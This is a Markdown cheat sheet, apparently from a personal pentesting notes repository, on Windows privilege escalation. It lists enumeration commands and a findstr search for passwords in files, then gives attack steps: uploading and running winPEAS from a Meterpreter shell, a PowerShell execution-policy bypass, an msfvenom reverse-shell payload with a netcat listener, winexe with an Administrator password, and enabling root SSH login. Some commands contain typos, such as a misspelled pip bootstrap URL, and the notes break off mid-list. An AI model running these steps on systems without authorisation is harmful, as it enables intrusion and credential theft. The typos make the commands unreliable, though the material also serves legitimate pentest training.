# Windows Privilege Escalation
## //cheat-sheet

**[Back to Command-Center](https://github.com/codetorok/command-center/blob/master/README.md)**


### Initial Enumeration
#### System Enumeration

* `systeminfo` basic system enumeration
* `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"` specific
* `hostname` get hostname
**Windows Managment Instrumentation Command Line** `wmic`
* `wmic qfe` **quick fix engeneering** shows what's available, what's been patched and when
* `wmic qfe Caption,Description,HotFixID,InstalledOn` looking for specific information
* `wmic logicaldisk` output is a little dirty
* `wmic logicaldisk get caption, description, providername` much cleaner
* `wmic logicaldisk get caption` fast and simple, less details

#### User Enumeration
* `whoami` or `whoami /priv` enumerate ourselves
* `whoami /groups` enumerate our group(s)
* `net user` enumerate users
* `net user administrator` enumeraing a specific user
* `net localgroup` enumerating a group or calling out by name ~net localgroup administrator`

#### Network Enumeration
* `ipconfig` or to get more details `ipconfig /all`
* `arp -a` arp table
* `route print` this will tell us where the machine is communicating
* `netstat -ano` to see what ports are out there, what are these listening ports, what are those port, where are those ports coming from? maybe those services are only available for us from the inside network?

#### Password hunting
* `findstr /si password *.txt` search for password in a text file
* `findstr /si password *.txt *.ini *.config` same as above but searching among multiple file extensions

#### AV / Firewall Enumeration
* `sc query windefend` information about Windows Defender **sc is for service control**
* `sc queryex type= service` listing all the services running on the machine
* `netsh advfirewall firewall dump` older command for info about the firewall
* `netsh firewall show state` more actual command for inf about the firewall
* `netsh firewall show config` to see the firewall's configuration
* `netsh sdvfirewall firewall dump` another variaton for all info on the firewall

### Exploiting via Kernel Exploit

#### Automated Tools
* winPEAS.exe (compile)
* seatbelt.exe (compile)
* Watson.exe (compile)
* Sharup.exe (compile)

#### Powershell
* Sherlock.ps1
* PowerUps.ps1
* jaws-enum.ps1

#### Other:
* windows-exploit-suggester.py (local)
* exploit suggester Metasploit

#### Exploring Autommated Tools
##### windows-exploit-suggerster.py : Steps to follow with windows-exploit-suggester.py
* 1. install: if regular pip install from repo causes problem, here's a one liner (windows-exploit-suggester.py): `curl https://bootsrtap.pypa.io//get-pyp.py -o get pip.py: python get-pip.py`
* 2. create database: `./windows-exploit-suggester.py --update`
* 3. run `systeminfo` on the target Windows machine and save it into a systeminfo.txt file.
* 4. finally: `./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo systeminfo.txt` systeminfo.txt is your previously saved file.

##### Metasploit
* in metasploit use `run post/multi//recon/local_exploit_suggester`

##### Metasploit and winPEAS
* on target machine from metasploit meterpreter shell:
* `cd /tmp`
* `upload /file_location_directory_on_attacker_machine/winPEAS.exe
* `shell`
* `./winPEAS.exe`

##### PowerUp
* when in a meterpreter shell you can use: `load powershell`, before running PowerUp.ps1 need to bypass the execution policy for PowerShell: `powershell -ep bypass`

##### manual exploit using msfvenom
* `msfvenom -p windows/shell_reverse_tcp lhost=<attacker machine's IP> lport=<listening port> -f aspx > manual.aspx`
* don't forget to listen on `nc -lnvp <port>

### Escalation path: password and port forwarding

* **winexe** is a script allowing us to use Linux commands on windows, use it from shell
* `winexe -U Administrator%<password> //127.0.0.1 "cmd.exe"

* on kali machine `apt install ssh`
* quick mod on ssh itself: `nano /etc/ssh/sshd_config` **#PermitRootLogin** uncomment it and change it's permission to **yes**
* 




